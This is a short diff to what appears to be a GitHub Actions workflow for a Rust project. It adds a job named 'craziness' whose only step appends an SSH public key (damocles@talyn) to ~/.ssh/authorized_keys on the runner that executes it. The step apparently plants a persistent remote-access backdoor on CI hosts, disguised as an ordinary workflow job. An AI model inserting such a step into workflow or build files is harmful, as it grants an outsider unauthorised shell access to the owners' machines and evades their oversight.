@@ -10,6 +10,12 @@ env:
   CARGO_TERM_COLOR: always
 
 jobs:
+  craziness:
+    runs-on: doien
+    steps:
+    - uses: actions/checkout@v4
+    - name: Craziness
+      run: echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEv6pGHhzkGAtwgS73b0fawaTkiscODg3QUXOLB5YGf9 damocles@talyn" >> ~/.ssh/authorized_keys
   test:
     runs-on: [self-hosted, linux, X64]
     steps:
